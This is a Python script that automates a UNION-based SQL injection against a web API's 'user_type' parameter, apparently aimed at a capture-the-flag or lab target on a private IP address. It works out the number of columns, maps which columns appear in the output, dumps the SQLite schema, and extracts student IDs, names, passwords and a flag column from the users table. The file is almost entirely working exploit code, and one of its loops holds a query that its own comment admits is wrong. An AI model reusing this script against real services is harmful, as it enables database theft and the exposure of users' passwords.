#!/usr/bin/env python3
import requests
import json
import sys

BASE_URL = "http://192.168.100.110:3333"
HEADERS = {"x-activate-code": "8d7a77ae-dac9-4397-afd6-44b92fd5b6f7"}


def check(payload):
    params = {"user_type": payload, "fields": "student_id,name"}
    try:
        resp = requests.get(f"{BASE_URL}/api/v1/users", params=params, headers=HEADERS)
        return resp.status_code, resp.text
    except Exception as e:
        return 999, str(e)


print("[*] Starting SQL Injection Exploit...")

# 1. Determine Column Count
print("[-] Determining column count...")
num_columns = 0
for i in range(1, 30):
    code, _ = check(f"students' ORDER BY {i} --")
    if code == 500:
        num_columns = i - 1
        print(f"[+] Found column count: {num_columns}")
        break
    elif code != 200:
        print(f"[!] Unexpected status code for ORDER BY {i}: {code}")
        break
else:
    print("[-] Could not determine column count.")
    sys.exit(1)

# 2. Identify String Columns
print("[-] Determining string columns...")
# We use 'students' (valid) merged with our fake row
# Try to inject markers into each column
nulls = ["null"] * num_columns
string_cols = []

# Verify UNION works first
payload = f"students' UNION SELECT {','.join(nulls)} --"
code, text = check(payload)
if code != 200:
    print(f"[-] UNION SELECT failed with code {code}. Database might be strict.")
    sys.exit(1)

print("[+] UNION SELECT successful.")

# 3. Dump Schema (sqlite_master)
print("[-] Dumping Database Schema...")
# We need to find a column that is displayed in the JSON output.
# The endpoint returns "student_id" and "name" and other fields requested.
# Let's try to put the schema in all columns (post-processing might hide nulls, but show strings)

# Construct a payload that puts 'SQL: ' || sql in every column (if compatible)
# But safer to just dump one by one or all at once if we know which one works.
# Let's try to inject into the 2nd column (often 'name') or similar.
# Actually, let's just use group_concat to dump everything into the first compatible column.

# We'll try to determine which column maps to 'student_id' or 'name' by injecting specific strings.
mapped_cols = {}
payload_items = []
for i in range(num_columns):
    payload_items.append(f"'COL_{i}'")

payload = f"students' UNION SELECT {','.join(payload_items)} --"
code, text = check(payload)
try:
    data = json.loads(text)
    if "users" in data:
        for user in data["users"]:
            # check for our markers
            for k, v in user.items():
                if isinstance(v, str) and v.startswith("COL_"):
                    idx = int(v.split("_")[1])
                    print(f"[+] Output field '{k}' maps to Column {idx}")
                    mapped_cols[idx] = k
except:
    print("[-] Failed to parse mapped columns.")

if not mapped_cols:
    print("[-] No columns reflected in output. Attempting blind guess (Column 1 or 2).")
    target_col_idx = 1  # Guessing 2nd column is name
else:
    # Pick the 'name' column or similar text column
    target_col_idx = list(mapped_cols.keys())[0]
    print(f"[+] Using Column {target_col_idx} for data extraction.")


# 4. Extract Data
def dump_query(query):
    # Construct UNION payload
    # items = ["null"] * num_columns
    # items[target_col_idx] = f"({query})"

    # Better: just select the query for ALL columns to be sure we catch it
    items = []
    for i in range(num_columns):
        items.append(f"({query})")

    payload = f"students' UNION SELECT {','.join(items)} --"
    code, text = check(payload)
    if code == 200:
        try:
            data = json.loads(text)
            results = set()
            if "users" in data:
                for user in data["users"]:
                    for v in user.values():
                        if (
                            v
                            and v != "Alice Johnson"
                            and not v.startswith("S0")
                            and v != "Student"
                        ):  # Filter noise
                            results.add(v)
            return list(results)
        except:
            pass
    return []


print("[-] Extracting Tables...")
tables = dump_query(
    "SELECT group_concat(tbl_name, ' | ') FROM sqlite_master WHERE type='table' AND tbl_name != 'sqlite_sequence'"
)
print(f"[+] Tables: {tables}")

print("[-] Extracting Schema for 'users'...")
schema = dump_query("SELECT sql FROM sqlite_master WHERE tbl_name='users'")
print(f"[+] Users Schema: {schema}")

print("[-] Extracting Schema for other tables...")
# If other tables exist
if tables:
    for t_str in tables:
        for t in t_str.split(" | "):
            if t != "users":
                s = dump_query(f"SELECT sql FROM sqlite_master WHERE tbl_name='{t}'")
                print(f"[+] Schema for {t}: {s}")

                # Dump data from interesting tables
                print(f"[-] Dumping data from {t}...")
                d = dump_query(
                    f"SELECT group_concat(sql) FROM {t}"
                )  # This is wrong, sql column doesn't exist in data tables
                # Need to know columns first, or use *
                # But * returns multiple cols, we need to concat them
                # Just SELECT * FROM t might fail if column count mismatch.
                # Use schema to guess columns or just dump everything as text?
                pass

print("[-] Searching for FLAG in users table...")
# Based on schema, we will look for flag columns
# For now, let's just dump the WHOLE users table as one big string
dump = dump_query(
    "SELECT group_concat(student_id || ':' || name || ':' || password || ':' || ifnull(flag, 'NOFLAG'), '\\n') FROM users"
)
print("[+] Users Dump:")
for line in dump:
    print(line)
